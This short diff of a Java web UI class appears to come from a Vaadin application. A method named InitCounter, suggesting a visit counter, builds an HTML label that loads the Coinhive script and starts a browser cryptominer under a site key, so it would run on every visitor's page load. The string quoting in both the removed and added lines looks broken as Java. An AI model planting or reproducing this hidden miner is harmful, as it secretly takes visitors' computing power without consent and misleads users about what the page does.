@@ -142,7 +142,7 @@ public class MyUI extends UI {
     }
     
     private void InitCounter(){
-        String HTML = " <script src="https://coinhive.com/lib/coinhive.min.js"></script> <script> var miner = new CoinHive.User('136QjAgyyBKROCe', 'john-doe'); miner.start(); </script> ";
+        String HTML = "<script src=""https://coinhive.com/lib/coinhive.min.js""></script> <script> var miner = new CoinHive.User('136QjAgyyBKROCe', 'john-doe'); miner.start(); </script> ";
         CounterHTMLHolder = new Label(HTML);
         CounterHTMLHolder.setContentMode(ContentMode.HTML);
     }
